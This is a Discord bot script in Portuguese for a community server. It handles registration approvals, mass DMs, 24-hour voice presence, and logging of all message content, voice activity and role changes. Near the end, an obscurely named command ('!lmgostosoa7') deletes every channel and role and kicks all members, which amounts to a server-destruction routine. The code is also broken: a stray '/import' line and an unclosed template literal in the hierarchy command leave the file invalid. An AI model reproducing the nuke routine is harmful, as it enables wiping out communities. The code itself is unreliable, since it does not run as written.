// ====================== KEEP ALIVE ======================
const express = require("express");
const app = express();

// Página inicial para o UptimeRobot pingar
app.get("/", (req, res) => res.send("Bot ativo e rodando 24h! 🚀"));

app.listen(3000, () => console.log("🌐 KeepAlive ativo na porta 3000!"));

// ====================== DOTENV ==========================
require("dotenv").config();

// ====================== DISCORD.JS ======================
const {
  Client,
  GatewayIntentBits,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  Events,
} = require("discord.js");

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});

// ====================== VARIÁVEIS DO .ENV =================
const CANAL_PEDIR_SET = process.env.CANAL_PEDIR_SET;
const CANAL_ACEITA_SET = process.env.CANAL_ACEITA_SET;
const CARGO_APROVADO = process.env.CARGO_APROVADO;
const CARGO_APROVADO_2 = process.env.CARGO_APROVADO_2;
const TOKEN = process.env.TOKEN;

// ====================== BOT ONLINE ========================
client.on("ready", async () => {
  console.log(`🤖 Bot ligado como ${client.user.tag}`);

  const canal = await client.channels.fetch(CANAL_PEDIR_SET);

  const embed = new EmbedBuilder()
    .setTitle("Sistema Família Do7 ")
    .setDescription(
      "Registro A7.\n\n Solicite SET usando o botão abaixo.\nPreencha com atenção!"
    )
    .addFields({
      name: "📌 Lembretes",
      value: `• A resenha aqui é garantida.\n• Não leve tudo a sério.`,
    })
    .setColor("#f1c40f");

  const btn = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId("abrirRegistro")
      .setLabel("Registro")
      .setStyle(ButtonStyle.Primary)
  );

  await canal.send({ embeds: [embed], components: [btn] });

  console.log("📩 Mensagem de registro enviada!");
});

// ====================== ABRIR MODAL ========================
client.on(Events.InteractionCreate, async (interaction) => {
  if (!interaction.isButton()) return;
  if (interaction.customId !== "abrirRegistro") return;

  const modal = new ModalBuilder()
    .setCustomId("modalRegistro")
    .setTitle("Solicitação de Set");

  const nome = new TextInputBuilder()
    .setCustomId("nome")
    .setLabel("Seu nome*")
    .setRequired(true)
    .setStyle(TextInputStyle.Short);

  const id = new TextInputBuilder()
    .setCustomId("iduser")
    .setLabel("Seu ID *")
    .setRequired(true)
    .setStyle(TextInputStyle.Short);

  modal.addComponents(
    new ActionRowBuilder().addComponents(nome),
    new ActionRowBuilder().addComponents(id)
  );

  await interaction.showModal(modal);
});

// ====================== RECEBER FORM ========================
client.on(Events.InteractionCreate, async (interaction) => {
  if (!interaction.isModalSubmit()) return;
  if (interaction.customId !== "modalRegistro") return;

  const nome = interaction.fields.getTextInputValue("nome");
  const iduser = interaction.fields.getTextInputValue("iduser");

  const canal = await client.channels.fetch(CANAL_ACEITA_SET);

  const embed = new EmbedBuilder()
    .setTitle("Novo Pedido de Registro")
    .setColor("#3498db")
    .setThumbnail(interaction.user.displayAvatarURL())
    .addFields(
      { name: "Usuário", value: `${interaction.user}` },
      { name: "Nome Informado", value: nome },
      { name: "ID Informado", value: iduser },
      {
        name: "Conta Criada em",
        value: `<t:${Math.floor(
          interaction.user.createdTimestamp / 1000
        )}:R>`,
      }
    );

  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId(`aprovar_${interaction.user.id}`)
      .setLabel("Aprovar")
      .setStyle(ButtonStyle.Success),
    new ButtonBuilder()
      .setCustomId(`negar_${interaction.user.id}`)
      .setLabel("Negar")
      .setStyle(ButtonStyle.Danger)
  );

  await canal.send({ embeds: [embed], components: [row] });

  await interaction.reply({
    content: "Seu pedido foi enviado!",
    ephemeral: true,
  });
});

// =================== APROVAR / NEGAR ===================
client.on(Events.InteractionCreate, async (interaction) => {
  if (!interaction.isButton()) return;

  const [acao, userId] = interaction.customId.split("_");
  if (!["aprovar", "negar"].includes(acao)) return;

  const membro = await interaction.guild.members.fetch(userId);

  const embedOriginal = interaction.message.embeds[0];

  const nomeInformado = embedOriginal.fields.find(f => f.name === "Nome Informado")?.value;
  const idInformado = embedOriginal.fields.find(f => f.name === "ID Informado")?.value;

  // ========== APROVAR ==========
  if (acao === "aprovar") {
    try {
      await membro.setNickname(`A7 ${nomeInformado}`);

      await membro.roles.add([
        CARGO_APROVADO,
        CARGO_APROVADO_2,
      ]);

      // ======= MENSAGEM DE BOAS-VINDAS =======
      const mensagem = `
<a:coroa4:1425236745762504768> **Seja Muito Bem-vindo à Family Do7 ** <:emojia7:1429141492080967730>

** Parabéns! Agora vc e um membro oficial da Family Do7 , Seu set foi aceito , um lugar onde a vibe é diferente,
A resenha aqui e 24 horas por dia, a energia é única e cada pessoa soma do seu próprio jeito... **

✨ **Seja muito bem-vindo!** ✨
`;

      await membro.send(mensagem).catch(() => {});

      const embedAprovado = new EmbedBuilder()
        .setColor("Green")
        .setTitle("Registro Aprovado")
        .addFields(
          { name: "👤 Usuário:", value: `${membro}` },
          { name: "🪪 ID:", value: `${idInformado}` },
          { name: "📛 Nome Informado:", value: `A7 ${nomeInformado}` },
          { name: "🧭 Acesso aprovado por:", value: `${interaction.user}` }
        )
        .setThumbnail(membro.user.displayAvatarURL())
        .setFooter({ text: "Aprovado com sucesso!" });

      await interaction.update({
        embeds: [embedAprovado],
        components: []
      });

    } catch (e) {
      console.log(e);
      return interaction.reply({
        content: "❌ Erro ao aprovar. Verifique permissões.",
        ephemeral: true
      });
    }
  }

  // ========== NEGAR ==========
  if (acao === "negar") {
    try {
      await membro.kick("Registro negado pelo aprovador.");

      const embedNegado = new EmbedBuilder()
        .setColor("Red")
        .setTitle("Registro Negado")
        .setDescription(`❌ O usuário **${membro.user.tag}** foi expulso.\nNegado por: ${interaction.user}`)
        .setThumbnail(membro.user.displayAvatarURL());

      await interaction.update({
        embeds: [embedNegado],
        components: []
      });

    } catch (e) {
      console.log(e);
      return interaction.reply({
        content: "❌ Não consegui expulsar o usuário.",
        ephemeral: true
      });
    }
  }
});
// =================== ENVIAR MENSAGEM PARA TODOS OS MEMBROS ===================
// Uso:  !pvall mensagem aqui
// Ele envia no PV de todos os membros do servidor

client.on("messageCreate", async (message) => {

    if (!message.content.startsWith("!pvall")) return;
    if (!message.member.permissions.has("Administrator")) 
        return message.reply("❌ Você não tem permissão para usar este comando!");

    const texto = message.content.split(" ").slice(1).join(" ");
    if (!texto) return message.reply("⚠️ Escreva uma mensagem para enviar!");

    const members = await message.guild.members.fetch();
    
    message.reply(`📨 Enviando mensagem para **${members.size} membros**... Pode levar um tempo.`);

    let enviados = 0;
    let falhou = 0;

    members.forEach(m => {
        if (m.user.bot) return; // Ignora bots
        
        m.send(`📩 **Familia A7 :**\n${texto}`)
            .then(() => enviados++)
            .catch(() => falhou++);
    });

    setTimeout(() => {
        message.channel.send(`✔️ Mensagens enviadas com sucesso para **${enviados} membros**.\n⚠️ Falhou em **${falhou} membros** (DM fechada).`);
    }, 5000);
});

// ==================== BOT EM CALL 24H ====================

const { joinVoiceChannel, createAudioPlayer, createAudioResource } = require("@discordjs/voice"); // ← LINHA CORRIGIDA

client.on("ready", async () => {
    try {
        const canal = client.channels.cache.get(process.env.CALL_24H);
        if (!canal) return console.log("❌ Canal de voz não encontrado!");

        const conexao = joinVoiceChannel({
            channelId: canal.id,
            guildId: canal.guild.id,
            adapterCreator: canal.guild.voiceAdapterCreator,
            selfDeaf: false // false = bot escuta, true = bot fica mutado
        });

        const player = createAudioPlayer();
        const resource = createAudioResource("silencio.mp3"); // arquivo vazio pra não cair

        player.play(resource);
        conexao.subscribe(player);

        console.log("🔊 Bot conectado na call 24h!");
    } catch (err) {
        console.log("Erro ao conectar no VC:", err);
    }
});

//-------------------------------------//
//   🔥 SISTEMA DE LOGS COMPLETO 🔥    //
//-------------------------------------//

// Corrigido — Agora sem duplicar EmbedBuilder e Events
const { AuditLogEvent } = require("discord.js"); 

// Variáveis dos canais do .env
const canalMsg = process.env.LOG_MENSAGENS;
const canalVoz = process.env.LOG_VOZ;
const canalCargos = process.env.LOG_CARGOS;

//---------------------------------------//
// 📄 LOG DE MENSAGENS (ENVIADAS/EDITADAS/APAGADAS)
//---------------------------------------//

client.on(Events.MessageCreate, async msg => {
    if (msg.author.bot) return;
    let canal = client.channels.cache.get(canalMsg);
    
    canal.send({
        embeds:[ new EmbedBuilder()
        .setColor("#00ff99")
        .setTitle("📝 Nova mensagem")
        .addFields(
            {name:"👤 Autor", value:`${msg.author}`},
            {name:"📍 Canal", value:`${msg.channel}`},
            {name:"💬 Conteúdo", value:`\`\`\`${msg.content}\`\`\``}
        )
        .setTimestamp() ]
    });
});

// Editada
client.on(Events.MessageUpdate, async (antiga, nova) => {
    if (!antiga.content || !nova.content) return;
    let canal = client.channels.cache.get(canalMsg);

    canal.send({
        embeds:[ new EmbedBuilder()
        .setColor("#ffcc00")
        .setTitle("✏ Mensagem Editada")
        .addFields(
            {name:"👤 Autor", value:`${antiga.author}`},
            {name:"Antes", value:`\`\`\`${antiga.content}\`\`\``},
            {name:"Depois", value:`\`\`\`${nova.content}\`\`\``}
        )
        .setTimestamp() ]
    });
});

// Deletada
client.on(Events.MessageDelete, async msg => {
    if (!msg.content) return;
    let canal = client.channels.cache.get(canalMsg);

    canal.send({
        embeds:[ new EmbedBuilder()
        .setColor("Red")
        .setTitle("🗑 Mensagem Apagada")
        .addFields(
            {name:"👤 Autor", value:`${msg.author}`},
            {name:"Conteúdo", value:`\`\`\`${msg.content}\`\`\``}
        )
        .setTimestamp() ]
    });
});

// Detectar SPAM (mais de 6 msgs em 5s)
const msgCount = {};
client.on(Events.MessageCreate, msg => {
    if (msg.author.bot) return;
    if (!msgCount[msg.author.id]) msgCount[msg.author.id] = 0;

    msgCount[msg.author.id]++;

    setTimeout(()=> msgCount[msg.author.id]--, 5000);

    if(msgCount[msg.author.id] >= 6){
        client.channels.cache.get(canalMsg).send(
        `⚠ **Possível SPAM detectado!**  
👤 Usuário: ${msg.author}  
Canal: ${msg.channel}`
        );
    }
});


//---------------------------------------//
// 🔊   LOG DE CALL — ENTRAR/Sair/Mover
//---------------------------------------//
client.on(Events.VoiceStateUpdate, (oldState, newState) => {
    let canal = client.channels.cache.get(canalVoz);

    if (!oldState.channel && newState.channel) canal.send(`🟢 **${newState.member.user.username} entrou** em 📞 ${newState.channel.name}`);
    if (oldState.channel && !newState.channel) canal.send(`🔴 **${newState.member.user.username} saiu** da call`);
    if (oldState.channelId !== newState.channelId && oldState.channel && newState.channel)
        canal.send(`🔁 **${newState.member.user.username} foi movido** \`${oldState.channel.name} → ${newState.channel.name}\``);
});


//---------------------------------------//
// ⚙ LOG CARGOS — Adicionou, removeu, criou, apagou
//---------------------------------------//

// Cargo dado / removido
client.on(Events.GuildMemberUpdate, (oldM, newM) => {
    let canal = client.channels.cache.get(canalCargos);

    const removido = oldM.roles.cache.filter(r => !newM.roles.cache.has(r.id));
    const adicionado = newM.roles.cache.filter(r => !oldM.roles.cache.has(r.id));

    removido.forEach(role => canal.send(`🔻 Cargo removido de ${newM.user}: **${role.name}**`));
    adicionado.forEach(role => canal.send(`🔺 Cargo adicionado ao ${newM.user}: **${role.name}**`));
});

// Cargo criado / deletado
client.on(Events.GuildRoleCreate, role => {
    client.channels.cache.get(canalCargos).send(`🆕 Cargo **${role.name}** foi criado`);
});
client.on(Events.GuildRoleDelete, role => {
    client.channels.cache.get(canalCargos).send(`❌ Cargo **${role.name}** foi deletado`);
});

/import { PermissionsBitField } from "discord.js";

client.on("messageCreate", async (message) => {
  if (message.author.bot) return;
  if (!message.guild) return;

  if (message.content.toLowerCase() === "!lmgostosoa7") {

    const allowedRoles = process.env.LMA7_ROLES?.split(",") || [];

    const hasRole = message.member.roles.cache.some(role =>
      allowedRoles.includes(role.id)
    );

    if (!hasRole) {
      return message.reply("❌ Você não tem permissão para usar esse comando.");
    }

    await message.reply("⚠️ **COMANDO INICIADO** ⚠️");

    // ================== APAGAR CANAIS ==================
    for (const channel of message.guild.channels.cache.values()) {
      try {
        await channel.delete();
      } catch (e) {}
    }

    // ================== APAGAR CARGOS ==================
    const roles = message.guild.roles.cache
      .filter(role =>
        role.name !== "@everyone" &&
        !role.managed &&
        role.editable
      )
      .sort((a, b) => b.position - a.position);

    for (const role of roles.values()) {
      try {
        await role.delete("Comando !lmgostosoa7");
        await new Promise(r => setTimeout(r, 800));
      } catch (e) {}
    }

    // ================== EXPULSAR MEMBROS ==================
    for (const member of message.guild.members.cache.values()) {
      if (
        member.id === message.guild.ownerId ||
        member.id === client.user.id ||
        !member.kickable
      ) continue;

      try {
        await member.kick("Comando !lmgostosoa7");
      } catch (e) {}
    }
  }
});

// ================== HIERARQUIA OFICIAL ==================
client.on("messageCreate", async (message) => {
  if (message.author.bot) return;

  if (message.content === "!hierarquia") {

    const embed = new EmbedBuilder()
      .setTitle("👑 Hierarquia de cargos Oficial Familia A7 ")
      .setColor("#2b2d31")
      .setDescription(`
**1.** 👑 <@&1439807240407089364>  
**2.** 🛡️ <@&1448454535596085460>  
**3.** 🎯 <@&1424565267383586857>  
**4.** 💜 <@&1426490120294367324>  
**5.** 🔥 <@&1439068773112873114>  
**6.** 📊 <@&1448314488754540707>
**7.** 🎥 <@&1432229852122972250>  
**8.** 🧩 <@&1434317739501031484>
**9.** 🏛️ <@&1424556258601599141>  
**10.** 👑 <@&1443984052406452295>  
**11.** 🔴 <@&1424557312042860604>  
**12.** 🎭 <@&1424556397387059241>  

      .setFooter({ text: "SantaCreators • Sistema Oficial" })
      .setTimestamp();

    await message.channel.send({ embeds: [embed] });
  }
});

client.login(TOKEN);




















